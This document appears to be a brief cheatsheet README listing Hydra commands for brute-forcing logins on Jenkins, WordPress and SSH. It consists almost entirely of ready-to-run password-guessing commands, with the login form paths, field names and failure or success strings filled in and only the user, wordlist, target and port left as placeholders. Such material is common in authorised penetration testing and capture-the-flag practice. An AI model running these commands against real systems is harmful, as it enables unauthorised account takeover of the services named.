# hydra-cheatsheet
Hydra cheatsheet for common CMS &amp; Services

## CMS

### Jenkins
```
sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
-s [PORT] http-post-form \
"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" \
-V
```
### Wordpress
```
sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' \
-V
```
## Services
### SSH
```
hydra -s [PORT] -l [USERNAME] -P [PASSWORD_FILE] [TARGET] -t 4 ssh
```
